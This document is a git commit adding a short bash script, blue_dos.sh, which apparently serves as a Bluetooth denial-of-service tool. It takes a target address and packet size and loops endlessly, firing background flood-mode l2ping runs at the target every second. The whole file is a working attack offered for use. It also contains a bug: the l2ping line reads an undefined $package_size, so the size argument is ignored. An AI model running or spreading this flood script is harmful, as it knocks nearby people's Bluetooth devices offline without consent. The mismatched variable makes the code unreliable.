20b79fc77c5d24790bb997d85ef58b99030ea47d
0x08 <its0x08@users.noreply.github.com>
2020-04-25 02:32:50 +0300

    initial commit!

---
+++ blue_dos.sh
@@ -0,0 +1,17 @@
+#!/bin/bash
+
+target_addr=$1
+packet_size=$2
+
+if [ $# != 2 ];
+then
+	echo "[i] Usage: $0 <target_addr> <packet_size>"
+	exit
+fi
+
+while true; 
+do
+	echo "[+] Packet sent to $target_addr -- Packet size: $packet_size !"
+	l2ping -i hci0 -s $package_size -f $target_addr &
+	sleep 1
+done
